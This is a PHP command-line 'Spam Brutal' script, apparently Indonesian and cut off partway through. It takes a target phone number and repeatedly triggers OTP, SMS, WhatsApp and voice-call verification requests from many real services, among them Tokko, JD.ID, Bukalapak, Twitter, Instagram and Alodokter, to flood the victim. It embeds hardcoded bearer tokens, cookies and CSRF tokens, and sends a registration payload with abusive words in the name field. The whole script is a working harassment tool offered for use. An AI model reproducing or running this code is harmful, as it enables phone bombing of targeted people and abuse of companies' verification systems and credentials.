system("clear");
/* START COLOR */
$res="\033[0m";
$hitam="\033[0;30m";
$abu2="\033[1;30m";
$putih="\033[0;37m";
$putih2="\033[1;37m";
$red="\033[0;31m";
$red2="\033[1;31m";
$green="\033[0;32m";
$green2="\033[1;32m";
$yellow="\033[0;33m";
$yellow2="\033[1;33m";
$blue="\033[0;34m";
$blue2="\033[1;34m";
$purple="\033[0;35m";
$purple2="\033[1;35m";
$lblue="\033[0;36m";
$lblue2="\033[1;36m";
$HITAM="\033[40m";
$MERAH="\033[41m";
$HIJAU="\033[42m";
$KUNING="\033[43m";
$BIRU="\033[44m";
$UNGU="\033[45m";
$CYAN="\033[46m";
$PUTIH="\033[47m";
$Off="\033[0m";
/*off*/


function fetch_value($str,$find_start,$find_end) {
	$start = @strpos($str,$find_start);
	if ($start === false) {
		return "";
	}
	$length = strlen($find_start);
	$end = strpos(substr($str,$start +$length),$find_end);
	return trim(substr($str,$start +$length,$end));
}


function url($url){
$headers = array();
$headers[] = "Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36 GSA/11.29.10.21.arm64";
$ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, $url);
      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
      $res = curl_exec($ch);
return $res;
}

error_reporting(0);

$res = url("https://pastebin.com/gDyBU0wx");
//echo $res."\n";
$l1 = explode('Link: ',$res);
$l2 = explode(' ',$l1[1]);
//echo $link[0]."\n";
$pw1 = explode('Pass: ',$res);
$pw = explode(' ',$pw1[1]);
//echo $pass[0]."\n";

$pass = $pw[0];
$read = file_get_contents("pass");

if($pass == "up"){

echo $putih."------------------------------------------------\n";
echo $kuning."[".date('d-m-Y')."]-[".date("H:i")."]  \n";
echo $putih."------------------------------------------------\n";
echo $blue." - Support my Channel".$green."  H20 Studio\n";
echo $putih."------------------------------------------------\n";
echo $blue." - Join group ".$green." PRIVATE GROUP\n";
echo $putih."------------------------------------------------\n\n";

sleep(2);
echo $red." > ".$putih."Silahkan update script ke versi terbaru..!!\n";
sleep(1);
echo $red." > ".$putih."Copy link : ".$green.$l2[0]."\n\n";
sleep(1);
exit;
}

if ($pass == 'off'){
sleep(2);
echo $red2."TRIAL HABIS AWOKAWOK\n\n";
sleep(1);
exit;
}else{
if($read == $pass){
}else{
$save = fopen("pass", "w");
sleep(2);
echo $white."[▶] Subrek Channel".$green." H20 Studio".$green."\n";
sleep(1);
echo $yellow."[▶] Link Password: ".$red.$l2[0]."\n";
sleep(2);
echo $yellow."[▶] Masukan Password: ".$putih;
$psw = trim(fgets(STDIN));

if($psw == $pass){
fwrite($save, $psw);
sleep(2);
echo $green."\n[🔐] Password Benar Ngab\n";
fclose($save);
sleep(1);
system("clear");
}else{
sleep(2);
echo $red."\n[🔐] Password Salah Ngab\n\n";
sleep(1);
exit;
}
}
}


 
 
 ____                          ____          _        _
/ ___| _ __   __ _ _ __ ___   | __ ) _ __ _   _| |_ __ _| |
\___ \| '_ \ / _` | '_ ` _ \  |  _ \| '__| | | | __/ _` | |
 ___) | |_) | (_| | | | | | | | |_) | |  | |_| | || (_| | |
|____/| .__/ \__,_|_| |_| |_| |____/|_|   \__,_|\__\__,_|_|
      |_|\n";
echo $putih."\n------------------------------------------------\n";
echo $lblue."[-] Message  :".$green."Selamat Datang\n";
echo $lblue."[!] Server   :".$green."Online\n";
echo $lblue."[?] Script   :".$putih."Spam Brutal\n";
echo $lblue."[-] Versi    :".$yellow."1.0\n";
echo $lblue."[-] Akun     :".$putih2."Premium\n";
echo $putih."\n------------------------------------------------\n";
echo $green."[!] Creator    :".$putih."Hendar\n";
echo $green."[-] Whatsapp   :".$putih."085724875555\n";
echo $green."[-] Support by :".$putih."Subscriber ".$yellow."[".date('d-m-Y')."]-[".date("H:i")."]  \n";
echo $putih."\n------------------------------------------------\n";
echo $blue."[-] Youtube  :".$green."H20 Studio\n";
echo $blue."[-] Group WA :".$green."bit.ly/3ddfT2F\n";
echo $putih."\n------------------------------------------------\n";
sleep(0);
echo $red2."\n[1] Mulai Spam";
//echo $putih2."\n[2] beli script versi premium";
//echo $putih2."\n[ 3 ] keuntungan script versi premium";
echo $putih2."\n[2] Info Donasi";
sleep(1);
echo $yellow2."\n[▶] Pilih Menu : ";
$menu=trim(fgets(STDIN));
if($menu=="2"){
echo "\n           ~[!] info [!]~\n";
echo "\ndana,ovo,pulsa => 085724875555";
echo "\natau =>  https://saweria.co/H20Studio    ";
//exit;
}else{
	
sleep(1);
system("xdg-open https://www.youtube.com/c/HendarOfficial1");



if($menu=="1"){

echo "\nOpening Script";
sleep(1);
system("clear");
//$nomor="81327753909";
echo $green2."[▶] Awali Angka 8 ".$putih2."Cth:857Xxxxxxxx)\n";
echo $green2."[▶] INPUT: ".$putih2;
$nomor=trim(fgets(STDIN));
echo $green2."\n[?] Seting Detik: ".$putih2;
$time=trim(fgets(STDIN));
if($nomor=="85724875555"){
echo $red2."\nLiat Contoh Ngab...!!";
exit;
}else{

echo $green2."[▶] NO TARGET ".$putih2.$nomor.$putih2.".".$green2." (y/n) : ";
$confirm=trim(fgets(STDIN));
if($confirm=="n"){
echo $red2."\nDIBATALKAN";
sleep(2);
}else{
//exit;
if($confirm=="y"){

//}else{
echo "\nStarting Spam";
sleep(1);
system("clear");

while(true){
$ua1=array(
"Host: api.tokko.io",
"accept-language: id",
"x-tokko-api-client: android",
"x-tokko-api-client-version: 2.1.8",
"x-tokko-api-client-dist-number: 22",
"content-type: application/json"
);

$ua2=array(
"Host: api.tokko.io",
"accept-language: id",
"x-tokko-api-client: android",
"x-tokko-api-client-version: 2.1.8",
"x-tokko-api-client-dist-number: 22",
"content-type: application/json"
);

$ua3=array(
"Host: service-goauth.mokapos.com",
"accept: application/json, text/plain",
"authorization: undefined",
"user-agent: Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"content-type: application/json;charset=UTF-8"
);

$ua4=array(
"Host: m.elevenia.co.id",
"Connection: keep-alive",
"X-Requested-With: XMLHttpRequest",
"Content-Type: application/x-www-form-urlencoded; charset=UTF-8",
);

$ua5=array(
"Host: passport.jd.id",
"Connection: keep-alive",
"Accept: application/json, text/plain",
"X-Requested-With: XMLHttpRequest",
"Content-Type: application/x-www-form-urlencoded",
"Cookie: _deviceId=bc9f74c6-16ff-4b2b-a64e-64c13b99cc9a; _tk=U1f7j6r8go1ptc1fsp2r0q9f1gdj0; __jda=63461492.16230686166371789603384.1623068616.1623068616.1623068616.1; __jdv=63461492|www.google.com|-|referral|-|1623068616645; __jdc=63461492; mba_muid=16230686166371789603384; _fbp=fb.1.1623068619078.425688418; _gcl_au=1.1.1355869859.1623068619; _gid=GA1.2.1583489982.1623068619; tg=d41d8cd98f00b204e9800998ecf8427e; _tgpc=aef48246-3e4f-5ec8-b62a-ccdd33a30c71; _tgrsid=aa5d4530-2ad7-578f-8596-818918ab9794; _tglksd=eyJzIjoiYWE1ZDQ1MzAtMmFkNy01NzhmLTg1OTYtODE4OTE4YWI5Nzk0Iiwic3QiOjE2MjMwNjg2Mjc2NzZ9; _tgsource=www.google.com; _tgsc=aa5d4530-2ad7-578f-8596-818918ab9794:-1; __jdb=63461492.2.16230686166371789603384|1.1623068616; mba_sid=16230686166539624579021190784.2; _ga_VZMC86167F=GS1.1.1623068619.1.1.1623068642.37; _ga=GA1.3.664289980.1623068619; _gid=GA1.3.1583489982.1623068619; _ga=GA1.2.664289980.1623068619; _tgtim=aa5d4530-2ad7-578f-8596-818918ab9794:1623068630912:-1"
);

$r8=rand(11111111,99999999);
$r7=rand(1111111,9999999);
$r2=rand(10,99);
$ua6=array(
"Host: accounts.bukalapak.com",
//"bukalapak-otp-device-id: 2462477e3c55433507e7dc58ca8fd6a5",
"bukalapak-identity: ".$r7."e3c".$r8."e7dc".$r2."ca8fd6a5",
"content-type: application/json"
);

$ua7=array(
"Host: mobile.twitter.com",
"x-csrf-token: c9458936e112b1a26e1153da5f12c579",
"authorization: Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA",
"content-type: application/json",
"x-guest-token: 14013214536271923"
);

$ua8=array(
"Host: www.matahari.com",
"x-newrelic-id: Vg4GVFVXDxAGVVlVBgcGVlY=",
"x-requested-with: XMLHttpRequest",
"content-type: application/json"
);

$ua9=array(
"Host: wapi.ruparupa.com",
"authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiNTQxOGMwOGQtMTc2MC00Y2MyLWEyODQtMDEyMzcxOTI0Mzg1IiwiaWF0IjoxNjIyODg0MjkwLCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.wKiljzKruDgKHMZy0HqlOcJeQesinNq9Y4tnxyB1PoA",
"accept: application/json",
"content-type: application/json",
);

$ua10=array(
"Host: id.jagreward.com",
"Connection: keep-alive",
"Accept: */*",
"X-Requested-With: XMLHttpRequest",
"Save-Data: on",
"User-Agent: Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"Sec-Fetch-Site: same-origin",
"Sec-Fetch-Mode: cors",
"Sec-Fetch-Dest: empty",
"Referer: https://id.jagreward.com/member/register/",
"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
);

$ua11=array(
"Host: mapp.alodokter.com",
"accept: application/vnd.alodokter+json;version=3.1.1",
"content-type: application/json; charset=UTF-8"
);

$ua12=array(
"Host: www.instagram.com",
"user-agent: Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"content-type: application/x-www-form-urlencoded",
"x-requested-with: XMLHttpRequest",
"x-csrftoken: jHwzjneaNZ8qQhnJNobAXfthaheJxmyH"
);

$ua13=array(
"Host: beryllium.mapclub.com",
"client-timestamp: 1623405932808",
"authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJndWVzdENvZGUiOiJiOGYxZDViNC05NmY5LTQ5NDQtODhjMy0yNmFmZDRmMzM4NGIiLCJleHBpcmVkIjoxNjIzNDA5NDg5MDQ5LCJleHBpcmUiOjM2MDAsImV4cCI6MTYyMzQwOTQ4OSwiaWF0IjoxNjIzNDA1ODg5LCJwbGF0Zm9ybSI6IldFQiJ9.hamBDWCnAxcYprHbsCn9sveOl8N8TeQ5OnZLxsMQCR_BiOG5Y5mwvL9IyW6LDQ1146_tXvBw5F8Z1X0831oWog",
"accept: application/json, text/plain",
"content-type: application/json",
"user-agent: Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"origin: https://www.mapclub.com",
"referer: https://www.mapclub.com/",
);

$ua14=array(
"Host: m.ok.ru",
"Connection: keep-alive",
"Content-Type: application/x-www-form-urlencoded",
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng",
);

$ua15=array(
"Host: www.halodoc.com",
"x-xsrf-token: 3C21AD907DB208A59E1CC5FB63478360FE15071D99CBB596393C09DD4FA81867C6A346090E9E9C3E112EE57CC681991CCE55",
"content-type: application/json",
"origin: https://www.halodoc.com",
"cookie: XSRF-TOKEN=3C21AD907DB208A59E1CC5FB63478360FE15071D99CBB596393C09DD4FA81867C6A346090E9E9C3E112EE57CC681991CCE55"
);

$ua17=array(
"Host: www.olx.co.id",
"x-panamera-fingerprint: ea6b6846fcc9b5114d33c72f1e247156#1623407335002",
"x-newrelic-id: VQMGU1ZVDxABU1lbBgMDUlI=",
"user-agent: Mozilla/5.0 (Linux; Android 10; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36",
"content-type: application/json",
"origin: https://www.olx.co.id",
"referer: https://www.olx.co.id/"
);

$ua16=array(
"Host: api.pizzahut.co.id",
"x-platform: WEBMOBILE",
"x-channel: 2",
"content-type: application/json;charset=UTF-8",
"accept: application/json",
"x-client-id: b39773b0-435b-4f41-80e9-163eef20e0ab",
"x-lang: en",
"origin: https://www.phd.co.id",
"referer: https://www.phd.co.id/register"
);

$ua18=array(

);

$ua19=array(

);

$ua20=array(

);

//while(true){
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.tokko.io/graphql");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua1);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"generateOTP","variables":{"input":{"phoneNumber":"+62'.$nomor.'","hashCode":"z5QS24Ff7LG","channel":"SMS","userType":"MERCHANT"}},"query":"mutation generateOTP($input: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $input) {\n    phoneNumber\n    __typename\n  }\n}\n"}');
	curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
	$result = curl_exec($ch);
$a = fetch_value($result,'"message":"','"');
if($a=="Permintaan kode OTP sudah melebihi batas maksimal, hubungi kami di help@tokko.io untuk bantuan."){
echo $red2."\n[gagal]".$purple2." limit [tokko]";
}else{
echo $green2. "\n[success]".$yellow2." mengirim pesan... [tokko]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";

for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
//echo "\ntokko: ".$result."\n";
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://api.tokko.io/graphql");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua2);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"operationName":"generateOTP","variables":{"input":{"phoneNumber":"+62'.$nomor.'","hashCode":"z5QS24Ff7LG","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($input: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $input) {\n    phoneNumber\n    __typename\n  }\n}\n"}');
	curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
	$result = curl_exec($ch);
$b=fetch_value($result,'"message":"','"');
if($b=="Permintaan kode OTP sudah melebihi batas maksimal, hubungi kami di help@tokko.io untuk bantuan."){
echo $red2."\n[gagal]".$purple2." limit [tokko]";
}else{
echo $green2. "\n[success]".$yellow2." mengirim whatsapp... [tokko]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
//echo "\ntokko: ".$result."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://service-goauth.mokapos.com/account/v1/verification/phone/send");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua3);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone_number":"+62'.$nomor.'"}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$c=fetch_value($result,'"status":"','"');
if($c=="ok"){
echo $green2. "\n[success]".$yellow2." mengirim pesan... [mokapos]";
}else{
echo $red2. "\n[eror]".$purple2." nomor terkena limit (gunakan no.lain)[mokapos]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";

for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
//echo "\nmokapos: ".$result."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://m.elevenia.co.id/register/sendVerSMS.do");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua4);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, "memID=syaiful2781996%40gmail.com&prtblTlphnNO=0'.$nomor.'");
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$d=fetch_value($result,'"result":"','"');

if($d=="E01"){
echo $red2."\n[eror]".$purple2." limit [ELEVANIA]";
}else{
echo $green2. "\n[success]".$yellow2." mengirim pesan... [elevania]";;
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
//echo "\nelevania: ".$result."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://passport.jd.id/sms/sendSMSCode");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua5);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, "phone=0'.$nomor.'&code=");
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
if($result=="false"){
echo $red2. "\n[eror]".$purple2." false [JD.ID]";
}else{
echo $green2. "\n[success]".$yellow2." mengirim pesan...[jd.id]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://accounts.bukalapak.com/register");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua6);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"access_token":"dAIBGFJbLnSR6xzRaOngL1--P0Sj6Rgkq-DQrDOOKWD6zQ","user":{"phone":"0'.$nomor.'"},"authenticity_token":"lEORMBbWwzCGow/DUkbVFuV43P6ch6QfWs7xAsqo4lmXp5zwCF9ibPwH0GQIg9Vm83fiG46kRFh6Vmf+yeyjhg=="}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$e=fetch_value($result,'"message":"','"');
echo $yellow2. "\n[result] ".$blue2.$e;
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
//if($e=="Token OTP berhasil dikirimkan ke 6285712971025
//echo "\nbukalapak: ".$result."\n";

for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://mobile.twitter.com/i/api/1.1/onboarding/begin_verification.json");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua7);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"0'.$nomor.'","use_voice":false,"send_auto_verify_hash":true,"flow_token":"g;162235573480094065:-1622936044997:TFtAbIM3tUflUi4iYGCIMDtF:0"}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
echo $red2. "\n[maintance]".$purple2." twitter";
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://www.matahari.com/rest/V1/thorCustomers");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua8);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"thor_customer":{"name":"ANJING,GBLK,TOLOL ","card_number":null,"email_address":"mr.major@gmail.com","mobile_country_code":"+62","gender_id":"1","mobile_number":"0'.$nomor.'","mro":"","password":"dua781996","birth_date":"16/06/1997"}}');
	curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
	$result = curl_exec($ch);
$f=json_decode($result);
$st=$f->outcome_message;
if($st=="Success"){
echo $green2. "\n[success]".$yellow2." mengirim pesan... [matahari]";
}else{
echo $red2. "\n[eror]".$purple2." unknown [MATAHARI]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://wapi.ruparupa.com/auth/generate-otp");
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $ua9);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_POSTFIELDS, '{"phone":"0'.$nomor.'","action":"register","channel":"message","email":"","customer_id":"0","is_resend":0}');
	curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
	$result = curl_exec($ch);
$g=json_decode($result);
$sta=$g->data->message;
if($sta=="Kode verifikasi berhasil dikirimkan"){
echo $green2. "\n[success]".$yellow2." mengirim pesan.... [ruparupa.com]";
}else{
echo $red2. "\n[eror]".$purple2." tunggu 1 menit [RUPARUPA.COM]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://id.jagreward.com/member/verify-mobile/".$nomor."/");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $ua10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        $res = curl_exec($ch);
$ah=json_decode($res);
$status=$ah->message;
if($status=="Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini."){
echo $green2. "\n[success]".$yellow2." mengirim panggilan... [jagreward]";
}else{
echo $red2. "\n[gagal]".$purple2." limit/kesalahan jaringan [JAGREWARD]";
}
//$j=json_decode($result);
//$stat=$j->button_status;
//if($stat=="calling"){
//echo "\n[success] target terima telfon dari jag";
//}else{
//echo "\n[eror] Sistem bermasalah [JAGREWARD]";
//}

echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://mapp.alodokter.com/api/v310/alodokter/users/get_otp.json");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua11);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"device_token":"fT9qm3UPSBWgYZVnu9Iob9:APA91bEGQ7dq0Nod_caUetRk3eIxMEVaLWkb9GOFBc1c91Y68HTYVwhYbZ9QHWCNmjcSb1O2JfQyEoWIMx4GPmUDFOFszj9CzDuIz3BzMhi1i9J_wKayhUTCFdwRKt8R-LM2NyicO3Yr","phone":"0'.$nomor.'","uuid":"88e07908-c6be-45b1-afd5-7bcb78774ae9"}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$js=json_decode($result);
$o=$js->status;
if($o=="success"){
echo $green2. "\n[success]".$yellow2." mengirim pesan... [alodok]";
}else{
echo $red2. "\n[eror]".$purple2." unknown [ALODOK]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.instagram.com/accounts/send_signup_sms_code_ajax/");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua12);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, "client_id=YLHfUAABAAEujocJbwT50VJGThwO&phone_number=62".$nomor."&phone_id=&big_blue_token=");
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$ja=json_decode($result);
$statu=$ja->status;
if($statu="ok"){
echo $green2. "\n[success]".$yellow2." mengirim pesan... [ig]";
}else{
echo $red2. "[gagal]".$purple2." kesalahan tak diketahui [INSTAGRAM]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://beryllium.mapclub.com/api/sms/otp/registration");
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_HTTPHEADER, $ua13);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"msisdn":"'.$nomor.'"}');
curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
$result = curl_exec($ch);
$ak=json_decode($result);
$ja=$ak->success;
if($ja=="true"){
echo $green2."\n[success]".$yellow2." mengirim pesan... [MAPCLUB]";
}else{
echo $red2."\n[404]".$purple2." gagal [MAPCLUB]";
}
echo "\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n";
for($i=$time; $i>=0; $i--){
echo "wait: ".$i." second";
sleep(1);
echo "\r                  \r";
$ti++;
 if($ti >4){
  $ti=0;
}
}
echo "\r                    \r";
$ch = curl_init();
